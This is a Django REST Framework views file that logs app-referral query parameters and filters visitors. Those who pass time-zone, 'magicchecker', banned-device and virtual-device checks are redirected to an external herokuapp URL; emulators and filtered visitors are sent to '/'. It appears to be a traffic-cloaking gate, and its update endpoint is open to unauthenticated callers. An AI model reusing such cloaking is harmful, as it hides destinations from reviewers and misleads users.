from rest_framework.permissions import AllowAny
from logs.models import Log, STATUS_FILTER_OFF, STATUS_SUCCESSFUL, STATUS_STOP_MCHECKER, STATUS_FILTER_NOT_STARTED
from logs.serializers import LogSerializer
from rest_framework.pagination import PageNumberPagination
from rest_framework.generics import CreateAPIView, UpdateAPIView

from django.shortcuts import redirect
from rest_framework.response import Response

from users.models import STATUS_USER_BAN, STATUS_DEVICE_BANNED, STATUS_VIRTUAL_DEVICE


class StandardResultsSetPagination(PageNumberPagination):
    page_size = 2
    page_size_query_param = 'page_size'


class LogViewSet(CreateAPIView):
    """
    API для простмотра и добавления логов
    """
    queryset = Log.objects.all().order_by('-created_at')
    serializer_class = LogSerializer
    permission_classes = [AllowAny]
    pagination_class = StandardResultsSetPagination

    def __init__(self):
        self.filter_one_time_zone_res = 'Not'
        self.filter_two_cheker_res = 'Not'
        self.user_url = 'Not'
        self.user_status = 'Not'
        self.new_id = 0
        super().__init__()

    def get(self, request):
        self.create(request, format=None)

    def create(self, request, *args, **kwargs):
        domen_and_packageid = self.request.query_params.get("domen")
        domen_and_packageid = domen_and_packageid.split('?')
        domen = domen_and_packageid[0]
        packageid = domen_and_packageid[1].split('=')[1]
        usserid = self.request.query_params.get("usserid")
        getz = self.request.query_params.get("getz")
        getr = self.request.query_params.get("getr")
        utm_medium = self.request.query_params.get("utm_medium")
        url = f'{domen}?packageid={packageid}&usserid={usserid}&getz={getz}&getr={getr}&utm_medium={utm_medium}'
        data = {
            'domen': domen,
            'packege_id': packageid,
            'usser_id': usserid,
            'getz_user': getz,
            'getr_user': getr,
            'utm_medium': utm_medium,
            'url': url,
        }
        self.user_url = url
        serializer = self.get_serializer(data=data)
        serializer.is_valid(raise_exception=True)
        self.perform_create(serializer)

    def perform_create(self, serializer):
        new = serializer.create(serializer.validated_data)
        self.filter_one_time_zone_res = new.filter_one_time_zone
        self.filter_two_cheker_res = new.filter_two_cheker
        self.user_status = new.status
        self.new_id = new.id
        new.save()

    def finalize_response(self, request, response, *args, **kwargs):
        if self.filter_one_time_zone_res != STATUS_FILTER_NOT_STARTED and self.filter_two_cheker_res != STATUS_FILTER_OFF\
                and self.user_status != STATUS_USER_BAN and self.user_status != STATUS_DEVICE_BANNED and self.user_status != STATUS_VIRTUAL_DEVICE:
            url = f'https://shrouded-ravine-59969.herokuapp.com/index.php?{self.user_url}?&id={self.new_id}'
            response = redirect(url)
            return response
        else:
            url = '/'
            response = redirect(url)
            return response


class LogsUpdateView(UpdateAPIView):

    queryset = Log.objects.all()
    serializer_class = LogSerializer
    permission_classes = [AllowAny]
    lookup_field = 'pk'

    def get(self, request):
        self.put(request, format=None)

    def update(self, request, *args, **kwargs):
        id = self.request.query_params.get("id")
        filter_two_cheker = self.request.query_params.get("magicchecker")
        if filter_two_cheker == 'YES':
            request.data['filter_two_cheker'] = STATUS_SUCCESSFUL
        elif filter_two_cheker == 'MAIN':
            request.data['filter_two_cheker'] = STATUS_STOP_MCHECKER
        instance = Log.objects.get(id=id)
        serializer = self.get_serializer(instance, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data)
        else:
            return Response({"message": "failed", "details": serializer.errors})

    def finalize_response(self, request, response, *args, **kwargs):
        url = '/'
        response = redirect(url)
        return response
